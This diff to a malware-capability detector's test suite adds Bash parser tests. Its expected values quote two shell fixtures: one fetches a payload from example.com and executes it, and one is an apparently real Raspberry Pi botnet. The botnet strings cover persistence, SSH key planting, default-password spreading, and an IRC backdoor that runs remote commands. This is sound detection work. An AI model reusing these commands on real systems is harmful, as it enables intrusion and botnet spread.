@@ -33,11 +33,20 @@ from capa.features.common import (
     ScriptLanguage,
 )
 from capa.features.address import FileOffsetRangeAddress
-from capa.features.extractors.script import LANG_CS, LANG_JS, LANG_PY, LANG_TEM, LANG_HTML, LANGUAGE_FEATURE_FORMAT
+from capa.features.extractors.script import (
+    LANG_CS,
+    LANG_JS,
+    LANG_PY,
+    LANG_TEM,
+    LANG_BASH,
+    LANG_HTML,
+    LANGUAGE_FEATURE_FORMAT,
+)
 from capa.features.extractors.ts.query import QueryBinding, HTMLQueryBinding, TemplateQueryBinding
 from capa.features.extractors.ts.tools import LANGUAGE_TOOLKITS
 from capa.features.extractors.ts.engine import (
     TreeSitterBaseEngine,
+    TreeSitterBashEngine,
     TreeSitterHTMLEngine,
     TreeSitterTemplateEngine,
     TreeSitterExtractorEngine,
@@ -45,7 +54,7 @@ from capa.features.extractors.ts.engine import (
 
 
 def do_test_ts_base_engine_init(engine: TreeSitterBaseEngine):
-    assert engine.language in [LANG_CS, LANG_TEM, LANG_HTML, LANG_JS]
+    assert engine.language in [LANG_BASH, LANG_CS, LANG_TEM, LANG_HTML, LANG_JS]
     assert isinstance(engine.query, QueryBinding)
     assert isinstance(engine.buf, bytes) and len(engine.buf) > 0
     assert isinstance(engine.tree, Tree)
@@ -70,7 +79,7 @@ def do_test_ts_base_engine_get_default_address(engine: TreeSitterBaseEngine):
     assert addr1.start_byte == addr2.start_byte and addr1.end_byte == addr2.end_byte
 
 
-def do_test_ts_extractor_engine_init(engine: TreeSitterExtractorEngine, expected_language: str):
+def do_test_ts_extractor_engine_init(engine: TreeSitterBaseEngine, expected_language: str):
     assert engine.language == expected_language
     assert isinstance(engine.query, QueryBinding)
     assert isinstance(engine.get_default_address(), FileOffsetRangeAddress)
@@ -99,7 +108,7 @@ def do_test_ts_extractor_engine_get_new_objects(
 
 
 def do_test_ts_extractor_engine_get_function_definitions(
-    engine: TreeSitterExtractorEngine, root_node: Node, expected: List[Tuple[str, str]]
+    engine: TreeSitterBaseEngine, root_node: Node, expected: List[Tuple[str, str]]
 ):
     assert list(engine.get_function_definitions(engine.tree.root_node)) == list(engine.get_function_definitions())
     assert len(list(engine.get_function_definitions(root_node))) == len(expected)
@@ -120,7 +129,7 @@ def do_test_ts_extractor_engine_get_function_definitions(
 
 
 def do_test_ts_extractor_engine_get_function_calls(
-    engine: TreeSitterExtractorEngine, root_node: Node, expected: List[Tuple[str, str]]
+    engine: TreeSitterBaseEngine, root_node: Node, expected: List[Tuple[str, str]]
 ):
     assert len(list(engine.get_function_call_names(root_node))) == len(expected)
     for node, (_, expected_id_range) in zip(engine.get_function_call_names(root_node), expected):
@@ -129,9 +138,7 @@ def do_test_ts_extractor_engine_get_function_calls(
         do_test_ts_base_engine_get_address(engine, node)
 
 
-def do_test_ts_extractor_engine_get_string_literals(
-    engine: TreeSitterExtractorEngine, root_node: Node, expected: List[str]
-):
+def do_test_ts_extractor_engine_get_string_literals(engine: TreeSitterBaseEngine, root_node: Node, expected: List[str]):
     assert len(list(engine.get_string_literals(root_node))) == len(expected)
     for node, expected_range in zip(engine.get_string_literals(root_node), expected):
         assert isinstance(node, Node)
@@ -140,7 +147,7 @@ def do_test_ts_extractor_engine_get_string_literals(
 
 
 def do_test_ts_extractor_engine_get_integer_literals(
-    engine: TreeSitterExtractorEngine, root_node: Node, expected: List[str]
+    engine: TreeSitterBaseEngine, root_node: Node, expected: List[str]
 ):
     assert len(list(engine.get_integer_literals(root_node))) == len(expected)
     for node, expected_range in zip(engine.get_integer_literals(root_node), expected):
@@ -158,7 +165,7 @@ def do_test_ts_extractor_engine_get_namespaces(engine: TreeSitterExtractorEngine
         do_test_ts_base_engine_get_address(engine, node)
 
 
-def do_test_ts_extractor_engine_get_global_statements(engine: TreeSitterExtractorEngine, expected: List[str]):
+def do_test_ts_extractor_engine_get_global_statements(engine: TreeSitterBaseEngine, expected: List[str]):
     assert len(list(engine.get_global_statements())) == len(expected)
     for node, expected_range in zip(engine.get_global_statements(), expected):
         assert isinstance(node, Node)
@@ -175,9 +182,197 @@ def do_test_ts_extractor_engine_get_assigned_property_names(
         do_test_ts_base_engine_get_address(engine, node)
 
 
+def do_test_bash_command_with_path_prefix():
+    toolkit = LANGUAGE_TOOLKITS[LANG_BASH]
+
+    assert toolkit.is_imported_function("/usr/bin/curl")
+    assert toolkit.format_imported_function("/usr/bin/curl") == "curl"
+
+
+def do_test_ts_bash_engine(engine: TreeSitterBashEngine, expected: dict):
+    root_node = engine.tree.root_node
+
+    do_test_ts_extractor_engine_init(engine, expected["language"])
+    do_test_ts_extractor_engine_get_function_definitions(engine, root_node, expected["all function definitions"])
+    do_test_ts_extractor_engine_get_function_calls(engine, root_node, expected["all function calls"])
+    do_test_ts_extractor_engine_get_string_literals(engine, root_node, expected["all string literals"])
+    do_test_ts_extractor_engine_get_integer_literals(engine, root_node, expected["all integer literals"])
+    do_test_ts_extractor_engine_get_global_statements(engine, expected["global statements"])
+    do_test_ts_base_engine_get_default_address(engine)
+    do_test_bash_command_with_path_prefix()
+
+
 @parametrize(
     "engine_str,expected",
     [
+        (
+            "sh_91800a_extractor_engine",
+            {
+                "language": LANG_BASH,
+                "all objects": [],
+                "all function definitions": [
+                    ("log_and_run() {", "log_and_run"),
+                    ("launch() {", "launch"),
+                ],
+                "all function calls": [
+                    ('echo "FATAL: This file is a static analysis fixture and must never be executed!" >&2', "echo"),
+                    ("return 1 2>/dev/null || exit 1", "return"),
+                    ("exit", "exit"),
+                    ("trap 'rm -f \"$tmp\"' EXIT", "trap"),
+                    ('eval "echo start"', "eval"),
+                    ('curl "$url" -o "$tmp"', "curl"),
+                    ('chmod 700 "$tmp"', "chmod"),
+                    ("mkfifo /tmp/f", "mkfifo"),
+                    ('exec bash "$tmp"', "exec"),
+                    ("test -f /etc/shadow", "test"),
+                    ("log_and_run", "log_and_run"),
+                ],
+                "all string literals": [
+                    '"FATAL: This file is a static analysis fixture and must never be executed!"',
+                    '"/tmp/.cache"',
+                    '"http://example.com/payload"',
+                    "'rm -f \"$tmp\"'",
+                    '"echo start"',
+                    '"$url"',
+                    '"$tmp"',
+                    '"$tmp"',
+                    '"$tmp"',
+                ],
+                "all integer literals": [
+                    "2",
+                    "1",
+                    "2",
+                    "1",
+                    "3",
+                    "700",
+                ],
+                "namespaces": [],
+                "global statements": [
+                    'echo "FATAL: This file is a static analysis fixture and must never be executed!" >&2',
+                    "return 1 2>/dev/null || exit 1",
+                    'tmp="/tmp/.cache"',
+                    "count=3",
+                    "if test -f /etc/shadow; then\n  log_and_run\nfi",
+                ],
+                "properties": [],
+            },
+        ),
+        (
+            "sh_cff512_extractor_engine",
+            {
+                "language": LANG_BASH,
+                "all objects": [],
+                "all function definitions": [],
+                "all function calls": [
+                    ('echo "FATAL: This file is a static analysis fixture and must never be executed!" >&2', "echo"),
+                    ("return 1 2>/dev/null || exit 1", "return"),
+                    ("exit", "exit"),
+                    ("realpath", "realpath"),
+                    ("echo $MYSELF >> $DEBUG", "echo"),
+                    ("mktemp -u 'XXXXXXXX'", "mktemp"),
+                    ("sudo cp $MYSELF /opt/$NEWMYSELF", "sudo"),
+                    ("sudo sh -c \"echo '#!/bin/sh -e' > /etc/rc.local\"", "sudo"),
+                    ('sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"', "sudo"),
+                    ("sudo sh -c \"echo 'exit 0' >> /etc/rc.local\"", "sudo"),
+                    ("sleep 1", "sleep"),
+                    ("sudo reboot", "sudo"),
+                    ("mktemp", "mktemp"),
+                    ("echo $TMP1 >> $DEBUG", "echo"),
+                    ("killall bins.sh", "killall"),
+                    ("killall minerd", "killall"),
+                    ("killall node", "killall"),
+                    ("killall nodejs", "killall"),
+                    ("killall ktx-armv4l", "killall"),
+                    ("killall ktx-i586", "killall"),
+                    ("killall ktx-m68k", "killall"),
+                    ("killall ktx-mips", "killall"),
+                    ("killall ktx-mipsel", "killall"),
+                    ("killall ktx-powerpc", "killall"),
+                    ("killall ktx-sh4", "killall"),
+                    ("killall ktx-sparc", "killall"),
+                    ("killall arm5", "killall"),
+                    ("killall zmap", "killall"),
+                    ("killall kaiten", "killall"),
+                    ("killall perl", "killall"),
+                    ('echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts', "echo"),
+                    ("rm -rf /root/.bashrc", "rm"),
+                    ("rm -rf /home/pi/.bashrc", "rm"),
+                    ("usermod -p ... pi", "usermod"),
+                    ("mkdir -p /root/.ssh", "mkdir"),
+                    ('echo "ssh-rsa ..."', "echo"),
+                    ('echo "nameserver 8.8.8.8" >> /etc/resolv.conf', "echo"),
+                    ("rm -rf /tmp/ktx*", "rm"),
+                    ("rm -rf /tmp/cpuminer-multi", "rm"),
+                    ("rm -rf /var/tmp/kaiten", "rm"),
+                    ("cat > /tmp/public.pem", "cat"),
+                    ("mktemp -u 'XXXXXXXX'", "mktemp"),
+                    ("cat > /tmp/$BOT", "cat"),
+                    ("chmod +x /tmp/$BOT", "chmod"),
+                    ("nohup /tmp/$BOT 2>&1 > /tmp/bot.log &", "nohup"),
+                    ("rm /tmp/nohup.log -rf", "rm"),
+                    ("rm -rf nohup.out", "rm"),
+                    ("sleep 3", "sleep"),
+                    ("rm -rf /tmp/$BOT", "rm"),
+                    ("mktemp -u 'XXXXXXXX'", "mktemp"),
+                    ("date > /tmp/.s", "date"),
+                    ("apt-get update -y --force-yes", "apt-get"),
+                    ("apt-get install zmap sshpass -y --force-yes", "apt-get"),
+                    ("mktemp", "mktemp"),
+                    ("zmap -p 22 -o $FILE -n 100000", "zmap"),
+                    ("killall ssh", "killall"),
+                    ("cat $FILE", "cat"),
+                    ("sshpass -praspberry scp ...", "sshpass"),
+                    ("echo $IP >> /opt/.r", "echo"),
+                    ("sshpass -praspberry ssh ...", "sshpass"),
+                    ("sshpass -praspberryraspberry993311 scp ...", "sshpass"),
+                    ("echo $IP >> /opt/.r", "echo"),
+                    ("sshpass -praspberryraspberry993311 ssh ...", "sshpass"),
+                    ("rm -rf $FILE", "rm"),
+                    ("sleep 10", "sleep"),
+                ],
+                "all string literals": [
+                    '"FATAL: This file is a static analysis fixture and must never be executed!"',
+                    '"$EUID"',
+                    "'XXXXXXXX'",
+                    "\"echo '#!/bin/sh -e' > /etc/rc.local\"",
+                    '"echo /opt/$NEWMYSELF >> /etc/rc.local"',
+                    "\"echo 'exit 0' >> /etc/rc.local\"",
+                    '"127.0.0.1 bins.deutschland-zahlung.eu"',
+                    '"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"',
+                    '"nameserver 8.8.8.8"',
+                    "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs\nglv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW\nrXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF\nWRq+Z8HYMvPlgSRA3wIDAQAB\n-----END PUBLIC KEY-----\n",
+                    "'XXXXXXXX'",
+                    '#!/bin/bash\n\nSYS=`uname -a | md5sum | awk -F\' \' \'{print $1}\'`\nNICK=a${SYS:24}\nwhile [ true ]; do\n\n\tarr[0]="ix1.undernet.org"\n\tarr[1]="ix2.undernet.org"\n\tarr[2]="Ashburn.Va.Us.UnderNet.org"\n\tarr[3]="Bucharest.RO.EU.Undernet.Org"\n\tarr[4]="Budapest.HU.EU.UnderNet.org"\n\tarr[5]="Chicago.IL.US.Undernet.org"\n\trand=$[$RANDOM % 6]\n\tsvr=${arr[$rand]}\n\n\teval \'exec 3<>/dev/tcp/$svr/6667;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\n\techo $NICK\n\n\teval \'printf "NICK $NICK\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\teval \'printf "USER user 8 * :IRC hi\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\tcontinue\n\tfi\n\n\t# Main loop\n\twhile [ true ]; do\n\t\teval "read msg_in <&3;"\n\n\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tbreak\n\t\tfi\n\n\t\tif  [[ "$msg_in" =~ "PING" ]] ; then\n\t\t\tprintf "PONG %s\\n" "${msg_in:5}";\n\t\t\teval \'printf "PONG %s\\r\\n" "${msg_in:5}" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tsleep 1\n\t\t\teval \'printf "JOIN #biret\\r\\n" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\telif [[ "$msg_in" =~ "PRIVMSG" ]] ; then\n\t\t\tprivmsg_h=$(echo $msg_in| cut -d\':\' -f 3)\n\t\t\tprivmsg_data=$(echo $msg_in| cut -d\':\' -f 4)\n\t\t\tprivmsg_nick=$(echo $msg_in| cut -d\':\' -f 2 | cut -d\'!\' -f 1)\n\n\t\t\thash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F\' \' \'{print $1}\'`\n\t\t\tsign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`\n\n\t\t\tif [[ "$sign" == "$hash" ]] ; then\n\t\t\t\tCMD=`echo $privmsg_data | base64 -d -i`\n\t\t\t\tRES=`bash -c "$CMD" | base64 -w 0`\n\t\t\t\teval \'printf "PRIVMSG $privmsg_nick :$RES\\r\\n" >&3;\'\n\t\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\tfi\n\tdone\ndone\n',
+                    "'XXXXXXXX'",
+                    '"cd /tmp && chmod +x $NAME && bash -c ./$NAME"',
+                    '"cd /tmp && chmod +x $NAME && bash -c ./$NAME"',
+                ],
+                "all integer literals": [
+                    "2",
+                    "1",
+                    "2",
+                    "1",
+                    "0",
+                    "1",
+                    "2",
+                    "1",
+                    "3",
+                    "22",
+                    "100000",
+                    "10",
+                ],
+                "namespaces": [],
+                "global statements": [
+                    'echo "FATAL: This file is a static analysis fixture and must never be executed!" >&2',
+                    "return 1 2>/dev/null || exit 1",
+                    "MYSELF=`realpath $0`",
+                    "DEBUG=/dev/null",
+                    "echo $MYSELF >> $DEBUG",
+                    'if [ "$EUID" -ne 0 ]\nthen ',
+                ],
+                "properties": [],
+            },
+        ),
         (
             "cs_138cdc_extractor_engine",
             {
@@ -270,6 +465,10 @@ def do_test_ts_extractor_engine_get_assigned_property_names(
     ],
 )
 def test_ts_extractor_engine(request: pytest.FixtureRequest, engine_str: str, expected: dict):
+    if expected["language"] == LANG_BASH:
+        bash_engine: TreeSitterBashEngine = request.getfixturevalue(engine_str)
+        do_test_ts_bash_engine(bash_engine, expected)
+        return
     engine: TreeSitterExtractorEngine = request.getfixturevalue(engine_str)
     do_test_ts_extractor_engine_init(engine, expected["language"])
     do_test_ts_extractor_engine_get_new_objects(engine, engine.tree.root_node, expected["all objects"])
@@ -1169,6 +1368,33 @@ FEATURE_PRESENCE_TESTS_SCRIPTS = sorted([
     ("aspx_15eed4", "global", Arch(ARCH_ANY), True),
     ("aspx_b75f16", "global", Arch(ARCH_ANY), True),
     ("aspx_d460ca", "global", Arch(ARCH_ANY), True),
+    ("sh_91800a", "global", Arch(ARCH_ANY), True),
+    ("sh_91800a", "global", OS(OS_ANY), True),
+    ("sh_91800a", "global", ScriptLanguage(LANGUAGE_FEATURE_FORMAT[LANG_BASH]), True),
+    ("sh_91800a", "file", Format(FORMAT_SCRIPT), True),
+    ("sh_91800a", "function=log_and_run", API("builtins.trap"), True),
+    ("sh_91800a", "function=log_and_run", API("builtins.eval"), True),
+    ("sh_91800a", "function=log_and_run", API("curl"), True),
+    ("sh_91800a", "function=log_and_run", API("chmod"), True),
+    ("sh_91800a", "function=log_and_run", String("echo start"), True),
+    ("sh_91800a", "function=log_and_run", Number(700), True),
+    ("sh_91800a", "function=launch", API("mkfifo"), True),
+    ("sh_91800a", "function=launch", API("builtins.exec"), True),
+    ("sh_91800a", "function=PSEUDO MAIN", Number(3), True),
+    ("sh_91800a", "function=PSEUDO MAIN", String("/tmp/.cache"), True),
+    ("sh_91800a", "function=PSEUDO MAIN", API("builtins.test"), True),
+    ("sh_91800a", "function=PSEUDO MAIN", API("exit"), True),
+    ("sh_cff512", "global", ScriptLanguage(LANGUAGE_FEATURE_FORMAT[LANG_BASH]), True),
+    ("sh_cff512", "file", Format(FORMAT_SCRIPT), True),
+    ("sh_cff512", "function=PSEUDO MAIN", API("killall"), True),
+    ("sh_cff512", "function=PSEUDO MAIN", API("openssl"), False),
+    ("sh_cff512", "function=PSEUDO MAIN", API("zmap"), True),
+    ("sh_cff512", "function=PSEUDO MAIN", API("apt-get"), True),
+    ("sh_cff512", "function=PSEUDO MAIN", API("usermod"), True),
+    ("sh_cff512", "function=PSEUDO MAIN", Number(6667), False),
+    ("sh_cff512", "function=PSEUDO MAIN", Substring("8.8.8.8"), True),
+    ("sh_cff512", "function=PSEUDO MAIN", Substring("base64"), True),
+    ("sh_cff512", "function=PSEUDO MAIN", Substring("awk"), True),
     ("py_24e48f", "global", Arch(ARCH_ANY), True),
     ("py_24e48f", "global", OS(OS_ANY), True),
     ("py_24e48f", "global", ScriptLanguage(LANGUAGE_FEATURE_FORMAT[LANG_PY]), True),
